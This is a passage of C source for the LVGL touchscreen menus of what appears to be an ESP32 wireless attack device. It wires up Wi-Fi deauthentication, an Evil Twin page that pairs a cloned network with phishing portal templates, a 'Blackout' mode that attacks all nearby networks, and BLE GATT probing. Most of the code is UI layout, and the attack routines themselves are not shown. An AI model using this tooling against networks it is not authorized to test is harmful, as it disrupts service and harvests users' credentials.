    lv_obj_add_event_cb(gatt_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"GATT Walker");

    // Add to BT Lookout watchlist
    lv_obj_t *add_lookout_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "Add to\nBT Lookout", COLOR_MATERIAL_RED, NULL, NULL);
    lv_obj_add_event_cb(add_lookout_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Add to Lookout");

    /* Back button — return to BT Scan & Select */
    lv_obj_t *back_btn = lv_btn_create(function_page);
    lv_obj_set_size(back_btn, 110, 30);
    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -8);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(back_btn, 4, 0);
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_font(back_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(back_icon, lv_color_white(), 0);
    lv_obj_t *back_lbl = lv_label_create(back_btn);
    lv_label_set_text(back_lbl, "BT Scan");
    lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(back_lbl, lv_color_white(), 0);
    lv_obj_add_event_cb(back_btn, bt_attack_tiles_back_cb, LV_EVENT_CLICKED, NULL);
}

static void stub_back_btn_cb(lv_event_t *e)
{
    void (*fn)(void) = (void (*)(void))lv_obj_get_user_data(lv_event_get_target(e));
    if (fn) fn(); else nav_to_menu_flag = true;
}

// Stub screen for not-yet-implemented features
static void show_stub_screen(const char *name, void (*back_fn)(void))
{
    create_function_page_base(name);

    lv_obj_t *label = lv_label_create(function_page);
    lv_label_set_text(label, "Coming Soon");
    lv_obj_set_style_text_font(label, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(label, ui_text_color(), 0);
    lv_obj_center(label);

    lv_obj_t *sublabel = lv_label_create(function_page);
    lv_label_set_text(sublabel, "This feature is under development");
    lv_obj_set_style_text_font(sublabel, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(sublabel, lv_color_make(176, 176, 176), 0);
    lv_obj_align(sublabel, LV_ALIGN_CENTER, 0, 40);

    /* Back button */
    lv_obj_t *back_btn = lv_btn_create(function_page);
    lv_obj_set_size(back_btn, 110, 28);
    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_set_style_pad_ver(back_btn, 4, 0);
    lv_obj_set_style_pad_hor(back_btn, 8, 0);
    lv_obj_set_style_pad_column(back_btn, 4, 0);
    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_font(back_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(back_icon, lv_color_white(), 0);
    lv_obj_t *back_lbl = lv_label_create(back_btn);
    lv_label_set_text(back_lbl, "Back");
    lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(back_lbl, lv_color_white(), 0);
    lv_obj_set_user_data(back_btn, (void *)back_fn);
    lv_obj_add_event_cb(back_btn, stub_back_btn_cb, LV_EVENT_CLICKED, NULL);
}

// ============================================================================
// END TILE-BASED NAVIGATION SYSTEM
// ============================================================================

static void show_evil_twin_page(void)
{
    // Ensure SD card is mounted before trying to read HTML templates
    esp_err_t sd_ret = ensure_sd_mounted();
    if (sd_ret != ESP_OK) {
        ESP_LOGW(TAG, "[EVIL_TWIN_PAGE] SD card not available: %s", esp_err_to_name(sd_ret));
    }
    
    create_function_page_base("Evil Twin");
    wifi_attacks_refresh_sd_html_list();

    evil_twin_content = lv_obj_create(function_page);
    lv_obj_set_size(evil_twin_content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(evil_twin_content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(evil_twin_content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(evil_twin_content, 0, 0);
    lv_obj_set_style_pad_all(evil_twin_content, 10, 0);
    lv_obj_set_style_pad_gap(evil_twin_content, 10, 0);
    lv_obj_set_flex_flow(evil_twin_content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(evil_twin_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    // Status label at the top
    evil_twin_status_label = lv_label_create(evil_twin_content);
    lv_obj_set_style_text_font(evil_twin_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(evil_twin_status_label, ui_text_color(), 0);
    lv_label_set_text(evil_twin_status_label, "Select network and portal template");

    lv_obj_t *net_label = lv_label_create(evil_twin_content);
    lv_label_set_text(net_label, "Evil Twin name:");
    lv_obj_set_style_text_font(net_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(net_label, ui_text_color(), 0);

    evil_twin_network_dd = lv_dropdown_create(evil_twin_content);
    lv_obj_set_width(evil_twin_network_dd, lv_pct(100));
    lv_dropdown_set_dir(evil_twin_network_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(evil_twin_network_dd, ui_bg_color(), LV_PART_MAIN);
    lv_obj_set_style_text_color(evil_twin_network_dd, ui_text_color(), LV_PART_MAIN);
    lv_obj_set_style_border_color(evil_twin_network_dd, ui_border_color(), LV_PART_MAIN);
    lv_obj_t *dd_list1 = lv_dropdown_get_list(evil_twin_network_dd);
    if (dd_list1) {
        lv_obj_set_style_bg_color(dd_list1, ui_bg_color(), 0);
        lv_obj_set_style_text_color(dd_list1, ui_text_color(), 0);
        lv_obj_set_style_border_color(dd_list1, ui_accent_color(), 0);
    }

    evil_twin_network_count = 0;
    int selected_indices[SCAN_RESULTS_MAX_DISPLAY];
    int selected_count = wifi_scanner_get_selected(selected_indices, SCAN_RESULTS_MAX_DISPLAY);
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
    uint16_t total_count = count_ptr ? *count_ptr : 0;

    size_t max_networks = (selected_count < SCAN_RESULTS_MAX_DISPLAY) ? selected_count : SCAN_RESULTS_MAX_DISPLAY;
    size_t net_buf_size = (max_networks > 0 ? max_networks : 1) * 64;
    char *net_options = (char *)lv_mem_alloc(net_buf_size);
    if (!net_options) {
        net_options = "No networks selected";
        max_networks = 0;
    }

    size_t net_len = 0;
    if (net_options != (char *)"No networks selected") {
        net_options[0] = '\0';
    }

    for (int i = 0; i < selected_count && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
        int idx = selected_indices[i];
        if (!records || idx < 0 || idx >= total_count) {
            continue;
        }

        char entry[64];
        if (records[idx].ssid[0]) {
            snprintf(entry, sizeof(entry), "%s (%d dBm)\n", (const char *)records[idx].ssid, records[idx].rssi);
        } else {
            snprintf(entry, sizeof(entry), "%02X:%02X:%02X:%02X:%02X:%02X (%d dBm)\n",
                     records[idx].bssid[0], records[idx].bssid[1], records[idx].bssid[2],
                     records[idx].bssid[3], records[idx].bssid[4], records[idx].bssid[5],
                     records[idx].rssi);
        }

        size_t entry_len = strlen(entry);
        if (net_options != (char *)"No networks selected" && net_len + entry_len < net_buf_size) {
            memcpy(net_options + net_len, entry, entry_len);
            net_len += entry_len;
            net_options[net_len] = '\0';
            evil_twin_network_map[evil_twin_network_count++] = idx;
        }
    }

    if (evil_twin_network_count == 0) {
        if (net_options != (char *)"No networks selected") {
            snprintf(net_options, net_buf_size, "No networks selected");
        }
        evil_twin_network_count = 0;
    }

    lv_dropdown_set_options(evil_twin_network_dd, net_options);
    lv_dropdown_set_selected(evil_twin_network_dd, 0);

    if (net_options != (char *)"No networks selected") {
        lv_mem_free(net_options);
    }

    lv_obj_t *html_label = lv_label_create(evil_twin_content);
    lv_label_set_text(html_label, "HTML Portal");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(html_label, ui_text_color(), 0);

    evil_twin_html_dd = lv_dropdown_create(evil_twin_content);
    lv_obj_set_width(evil_twin_html_dd, lv_pct(100));
    lv_dropdown_set_dir(evil_twin_html_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(evil_twin_html_dd, ui_bg_color(), LV_PART_MAIN);
    lv_obj_set_style_text_color(evil_twin_html_dd, ui_text_color(), LV_PART_MAIN);
    lv_obj_set_style_border_color(evil_twin_html_dd, ui_border_color(), LV_PART_MAIN);
    lv_obj_t *dd_list2 = lv_dropdown_get_list(evil_twin_html_dd);
    if (dd_list2) {
        lv_obj_set_style_bg_color(dd_list2, ui_bg_color(), 0);
        lv_obj_set_style_text_color(dd_list2, ui_text_color(), 0);
        lv_obj_set_style_border_color(dd_list2, ui_accent_color(), 0);
    }

    int html_total = wifi_attacks_get_sd_html_count();
    size_t max_html = (html_total < SCAN_RESULTS_MAX_DISPLAY) ? html_total : SCAN_RESULTS_MAX_DISPLAY;
    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
    char *html_options = (char *)lv_mem_alloc(html_buf_size);
    if (!html_options) {
        html_options = "No HTML templates";
        max_html = 0;
    }

    size_t html_len = 0;
    if (html_options != (char *)"No HTML templates") {
        html_options[0] = '\0';
    }

    for (int i = 0; i < html_total && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
        const char *name = wifi_attacks_get_sd_html_name(i);
        if (!name) {
            continue;
        }
        char entry[64];
        const char *display = strrchr(name, '/');
        if (display) {
            display++;
        } else {
            display = name;
        }
        snprintf(entry, sizeof(entry), "%s\n", display);
        size_t entry_len = strlen(entry);
        if (html_options != (char *)"No HTML templates" && html_len + entry_len < html_buf_size) {
            memcpy(html_options + html_len, entry, entry_len);
            html_len += entry_len;
            html_options[html_len] = '\0';
            evil_twin_html_map[evil_twin_html_count++] = i;
        }
    }

    if (evil_twin_html_count == 0) {
        if (html_options != (char *)"No HTML templates") {
            snprintf(html_options, html_buf_size, "No HTML templates");
        }
    }

    lv_dropdown_set_options(evil_twin_html_dd, html_options);
    lv_dropdown_set_selected(evil_twin_html_dd, 0);

    if (html_options != (char *)"No HTML templates") {
        lv_mem_free(html_options);
    }

    evil_twin_start_btn = lv_btn_create(evil_twin_content);
    lv_obj_set_size(evil_twin_start_btn, 150, 35);
    lv_obj_set_style_bg_color(evil_twin_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(evil_twin_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(evil_twin_start_btn, 0, 0);
    lv_obj_set_style_radius(evil_twin_start_btn, 8, 0);
    lv_obj_add_event_cb(evil_twin_start_btn, evil_twin_start_btn_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *start_label = lv_label_create(evil_twin_start_btn);
    lv_label_set_text(start_label, "Start Evil Twin");
    lv_obj_set_style_text_color(start_label, ui_text_color(), 0);
    lv_obj_center(start_label);

    // Update status label based on availability
    if (evil_twin_network_count == 0 || evil_twin_html_count == 0) {
        lv_obj_add_state(evil_twin_start_btn, LV_STATE_DISABLED);
        if (evil_twin_network_count == 0) {
            lv_label_set_text(evil_twin_status_label, "No selected networks available");
        } else {
            lv_label_set_text(evil_twin_status_label, "No HTML templates found on SD card");
        }
    } else {
        lv_obj_clear_state(evil_twin_start_btn, LV_STATE_DISABLED);
    }
}

void menu_event_cb(lv_event_t *e)
{
	// Get user data from the clicked object
    
    // Avoid printf in event callback to reduce VFS contention
    
    if (lv_event_get_code(e) == LV_EVENT_CLICKED) {
        // Use event user data instead of raw object user_data to avoid invalid pointers
        const char *name = (const char *)lv_event_get_user_data(e);
        if (name != NULL) {
            show_function_page(name);
        }
    }
}

/* ── BT Lookout conflict warning ──────────────────────────────── */

static lv_obj_t *s_bt_conflict_popup = NULL;
static void (*s_conflict_deferred_fn)(void) = NULL;

static void bt_conflict_dismiss_cb(lv_event_t *ev)
{
    (void)ev;
    if (s_bt_conflict_popup && lv_obj_is_valid(s_bt_conflict_popup)) {
        lv_obj_del(s_bt_conflict_popup);
        s_bt_conflict_popup = NULL;
    }
}

/* Called 250 ms after Stop&Go to let the lookout scan task finish its
   current bt_stop_scan() call before we start a fresh scan. */
static void bt_conflict_deferred_cb(lv_timer_t *t)
{
    lv_timer_del(t);
    if (s_conflict_deferred_fn) {
        void (*fn)(void) = s_conflict_deferred_fn;
        s_conflict_deferred_fn = NULL;
        fn();
    }
}

static void bt_conflict_proceed_cb(lv_event_t *ev)
{
    s_conflict_deferred_fn = (void (*)(void))lv_event_get_user_data(ev);
    if (s_bt_conflict_popup && lv_obj_is_valid(s_bt_conflict_popup)) {
        lv_obj_del(s_bt_conflict_popup);
        s_bt_conflict_popup = NULL;
    }
    bt_lookout_stop();
    ble_gap_disc_cancel();   /* stop active scan now; lookout task's later bt_stop_scan() becomes a no-op */
    bt_lookout_ui_active  = false;
    bt_lookout_status_lbl = NULL;
    bt_lookout_count_lbl  = NULL;
    bt_lookout_last_lbl   = NULL;
    bt_lookout_start_btn  = NULL;
    bt_lookout_edit_btn   = NULL;
    bt_lookout_oui_btn    = NULL;
    lv_timer_create(bt_conflict_deferred_cb, 250, NULL);
}

static void show_bt_conflict_warning(const char *fname, void (*proceed_fn)(void))
{
    if (s_bt_conflict_popup && lv_obj_is_valid(s_bt_conflict_popup)) {
        lv_obj_del(s_bt_conflict_popup);
    }

    /* Full-screen dimming overlay on lv_layer_top() */
    s_bt_conflict_popup = lv_obj_create(lv_layer_top());
    lv_obj_set_size(s_bt_conflict_popup, LV_PCT(100), LV_PCT(100));
    lv_obj_set_style_bg_color(s_bt_conflict_popup, lv_color_black(), 0);
    lv_obj_set_style_bg_opa(s_bt_conflict_popup, LV_OPA_60, 0);
    lv_obj_set_style_border_width(s_bt_conflict_popup, 0, 0);
    lv_obj_clear_flag(s_bt_conflict_popup, LV_OBJ_FLAG_SCROLLABLE);

    /* Warning card */
    lv_obj_t *card = lv_obj_create(s_bt_conflict_popup);
    lv_obj_set_size(card, 220, 185);
    lv_obj_center(card);
    lv_obj_set_style_bg_color(card, ui_card_color(), 0);
    lv_obj_set_style_border_color(card, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(card, 2, 0);
    lv_obj_set_style_radius(card, 10, 0);
    lv_obj_set_style_pad_all(card, 12, 0);
    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *title = lv_label_create(card);
    lv_label_set_text(title, LV_SYMBOL_WARNING "  BT Lookout Active");
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_16, 0);
    lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 0);

    char msg[100];
    snprintf(msg, sizeof(msg),
             "BT Lookout is still\nmonitoring. Starting\n\"%s\" will stop it.", fname);
    lv_obj_t *msg_lbl = lv_label_create(card);
    lv_label_set_text(msg_lbl, msg);
    lv_obj_set_style_text_font(msg_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(msg_lbl, ui_text_color(), 0);
    lv_label_set_long_mode(msg_lbl, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(msg_lbl, 196);
    lv_obj_align(msg_lbl, LV_ALIGN_TOP_MID, 0, 30);

    /* Cancel button */
    lv_obj_t *cancel_btn = lv_btn_create(card);
    lv_obj_set_size(cancel_btn, 90, 32);
    lv_obj_align(cancel_btn, LV_ALIGN_BOTTOM_LEFT, 0, 0);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(70, 70, 70), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(100, 100, 100), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(cancel_btn, 0, 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_lbl, "Cancel");
    lv_obj_set_style_text_font(cancel_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(cancel_lbl, lv_color_white(), 0);
    lv_obj_center(cancel_lbl);
    lv_obj_add_event_cb(cancel_btn, bt_conflict_dismiss_cb, LV_EVENT_CLICKED, NULL);

    /* Stop & Go button */
    lv_obj_t *proceed_btn = lv_btn_create(card);
    lv_obj_set_size(proceed_btn, 90, 32);
    lv_obj_align(proceed_btn, LV_ALIGN_BOTTOM_RIGHT, 0, 0);
    lv_obj_set_style_bg_color(proceed_btn, COLOR_MATERIAL_ORANGE, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(proceed_btn, lv_color_lighten(COLOR_MATERIAL_ORANGE, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(proceed_btn, 0, 0);
    lv_obj_set_style_radius(proceed_btn, 8, 0);
    lv_obj_t *proceed_lbl = lv_label_create(proceed_btn);
    lv_label_set_text(proceed_lbl, "Stop & Go");
    lv_obj_set_style_text_font(proceed_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(proceed_lbl, lv_color_white(), 0);
    lv_obj_center(proceed_lbl);
    lv_obj_add_event_cb(proceed_btn, bt_conflict_proceed_cb, LV_EVENT_CLICKED,
                        (void *)proceed_fn);
}

void attack_event_cb(lv_event_t *e)
{
    const char *attack_name = (const char *)lv_event_get_user_data(e);
    if (!attack_name) return;

    if (strcmp(attack_name, "Scan") == 0) {
        // Ensure WiFi mode is active (switch from BLE if needed)
        if (!ensure_wifi_mode()) {
            ESP_LOGE(TAG, "Failed to switch to WiFi mode for scan");
            return;
        }
        
        // Open scan page (clear previous content) - use base only to avoid default center label
        create_function_page_base("Scan");

        // Create spinner + status within function_page; ensure clean background
        lv_obj_set_style_bg_color(function_page, ui_bg_color(), 0);
        lv_obj_set_style_bg_opa(function_page, LV_OPA_COVER, 0);

        // Keep touch dot visible during scan
        show_touch_dot = true;

        // Delete old scan_status_label if exists
        if (scan_status_label) {
            lv_obj_del(scan_status_label);
            scan_status_label = NULL;
        }

        // Create centered scanning container with icon and text
        lv_obj_t *scan_container = lv_obj_create(function_page);
        lv_obj_set_size(scan_container, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
        lv_obj_center(scan_container);
        lv_obj_set_style_bg_opa(scan_container, LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_width(scan_container, 0, 0);
        lv_obj_set_flex_flow(scan_container, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_flex_align(scan_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_set_style_pad_gap(scan_container, 10, 0);
        
        // WiFi scanning icon
        lv_obj_t *scan_icon = lv_label_create(scan_container);
        lv_label_set_text(scan_icon, LV_SYMBOL_WIFI);
        lv_obj_set_style_text_font(scan_icon, &lv_font_montserrat_20, 0);
        lv_obj_set_style_text_color(scan_icon, ui_text_color(), 0);
        
        // Scanning text (larger)
        scan_status_label = lv_label_create(scan_container);
        lv_label_set_text(scan_status_label, "Scanning...");
        lv_obj_set_style_text_color(scan_status_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(scan_status_label, &lv_font_montserrat_20, 0);

        // Clear previous selections when user manually starts scan
        wifi_scanner_clear_selections();
        wifi_scanner_clear_targets();

        // Start scan
        wifi_scanner_start_scan();
        return;
    }

    if (strcmp(attack_name, "Deauther") == 0) {
        // Ensure WiFi mode is active (switch from BLE if needed)
        if (!ensure_wifi_mode()) {
            ESP_LOGE(TAG, "Failed to switch to WiFi mode for deauth");
            return;
        }
        
        // Open Deauther page
        show_function_page("Deauther");

        // Save current selection as attack targets, then start deauth
        wifi_scanner_save_target_bssids();
        wifi_attacks_start_deauth();
        
        // Store targets for rescan comparison and start rescan timer
        {
            int sel_indices[MAX_SCAN_RESULTS];
            int sel_count = wifi_scanner_get_selected(sel_indices, MAX_SCAN_RESULTS);
            uint16_t total_count = wifi_scanner_get_count();
            wifi_ap_record_t *recs = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * total_count);
            if (recs && total_count > 0) {
                int got_cnt = wifi_scanner_get_results(recs, total_count);
                deauth_target_count = 0;
                for (int i = 0; i < sel_count && deauth_target_count < MAX_SCAN_RESULTS; i++) {
                    int idx = sel_indices[i];
                    if (idx >= 0 && idx < got_cnt) {
                        memcpy(deauth_target_bssids[deauth_target_count], recs[idx].bssid, 6);
                        deauth_target_channels[deauth_target_count] = recs[idx].primary;
                        deauth_target_count++;
                    }
                }
                lv_mem_free(recs);
            }
            deauth_rescan_timer_start();
        }

        // Title centered at top - "Deauth attack in progress"
        deauth_prompt_label = lv_label_create(function_page);
        lv_label_set_text(deauth_prompt_label, "Deauth attack in progress");
        lv_obj_set_style_text_font(deauth_prompt_label, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(deauth_prompt_label, ui_text_color(), 0);
        lv_obj_align(deauth_prompt_label, LV_ALIGN_TOP_MID, 0, 36);

        // FPS label (hidden, but kept for internal use)
        deauth_fps_label = lv_label_create(function_page);
        lv_label_set_text(deauth_fps_label, "");
        lv_obj_add_flag(deauth_fps_label, LV_OBJ_FLAG_HIDDEN);

        // Build list of attacked networks with SSID, Freq, BSSID
        if (deauth_list) { deauth_list = NULL; }
        deauth_list = lv_list_create(function_page);
        lv_obj_set_size(deauth_list, lv_pct(100), LCD_V_RES - 30 - 36 - 70);  // Leave space for stop tile
        lv_obj_align(deauth_list, LV_ALIGN_TOP_MID, 0, 60);
        lv_obj_set_style_bg_color(deauth_list, ui_bg_color(), 0);
        lv_obj_set_style_text_color(deauth_list, ui_text_color(), 0);
        lv_obj_set_style_border_width(deauth_list, 0, LV_PART_ITEMS);
        lv_obj_set_style_border_color(deauth_list, lv_color_make(0, 0, 0), LV_PART_ITEMS);

        int selected_indices[MAX_SCAN_RESULTS];
        int sel_cnt = wifi_scanner_get_selected(selected_indices, MAX_SCAN_RESULTS);
        if (sel_cnt <= 0) {
            lv_list_add_text(deauth_list, "No networks selected");
        }

        uint16_t total = wifi_scanner_get_count();
        if (total == 0) {
            lv_list_add_text(deauth_list, "No scan results available");
        } else {
            wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * total);
            if (!records) {
                lv_list_add_text(deauth_list, "Memory error");
            } else {
                int got = wifi_scanner_get_results(records, total);

                for (int i = 0; i < sel_cnt; i++) {
                    int idx = selected_indices[i];
                    if (idx < 0 || idx >= got) continue;

                    const wifi_ap_record_t *ap = &records[idx];
                    char line[128];
                    const char *band = (ap->primary <= 14) ? "2.4" : "5";
                    
                    if (ap->ssid[0] != 0) {
                        snprintf(line, sizeof(line), "%s (Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
                                 (const char *)ap->ssid, ap->primary, band,
                                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
                    } else {
                        snprintf(line, sizeof(line), "(Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
                                 ap->primary, band,
                                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
                    }

                    lv_obj_t *row = lv_list_add_btn(deauth_list, NULL, "");
                    lv_obj_set_width(row, lv_pct(100));
                    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
                    lv_obj_set_style_pad_all(row, 6, 0);
                    lv_obj_set_style_pad_gap(row, 8, 0);
                    lv_obj_set_height(row, LV_SIZE_CONTENT);
                    lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
                    lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
                    lv_obj_set_style_radius(row, 8, 0);

                    lv_obj_t *lbl = lv_label_create(row);
                    lv_label_set_text(lbl, line);
                    lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
                    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
                    lv_obj_set_style_text_color(lbl, ui_text_color(), 0);
                    lv_obj_set_width(lbl, lv_pct(95));
                }

                lv_mem_free(records);
            }
        }

        // Stop & Exit tile at bottom (red with X icon)
        lv_obj_t *stop_tile = lv_btn_create(function_page);
        lv_obj_set_size(stop_tile, 120, 55);
        lv_obj_align(stop_tile, LV_ALIGN_BOTTOM_MID, 0, -10);
        lv_obj_set_style_bg_color(stop_tile, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(stop_tile, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(stop_tile, 0, 0);
        lv_obj_set_style_radius(stop_tile, 10, 0);
        lv_obj_set_style_shadow_width(stop_tile, 6, 0);
        lv_obj_set_style_shadow_color(stop_tile, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_shadow_opa(stop_tile, LV_OPA_40, 0);
        lv_obj_set_flex_flow(stop_tile, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_flex_align(stop_tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        
        lv_obj_t *x_icon = lv_label_create(stop_tile);
        lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
        lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_20, 0);
        lv_obj_set_style_text_color(x_icon, ui_text_color(), 0);
        
        lv_obj_t *stop_text = lv_label_create(stop_tile);
        lv_label_set_text(stop_text, "Stop & Exit");
        lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(stop_text, ui_text_color(), 0);
        
        lv_obj_add_event_cb(stop_tile, deauth_quit_event_cb, LV_EVENT_CLICKED, NULL);
        
        // Store reference (reuse quit_btn pointer)
        deauth_quit_btn = stop_tile;
        deauth_pause_btn = NULL;  // No pause button anymore
        
        deauth_paused = false;
        return;
    }

    if (strcmp(attack_name, "Evil Twin") == 0) {
        show_evil_twin_page();
        return;
    }

    if (strcmp(attack_name, "Blackout") == 0) {
        // Show warning page - use base to avoid default center label
        create_function_page_base("Blackout");
        
        // Warning message in center
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "Warning: This will attack\nall the networks around you.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        // Button container at bottom (15px higher)
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
        lv_obj_set_style_bg_color(btn_bar, ui_bg_color(), 0);
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_set_style_radius(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
        
        // BACK button
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, 90, 32);
        lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(back_btn, 0, 0);
        lv_obj_set_style_radius(back_btn, 8, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        // YES button
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, 90, 32);
        lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(yes_btn, 0, 0);
        lv_obj_set_style_radius(yes_btn, 8, 0);
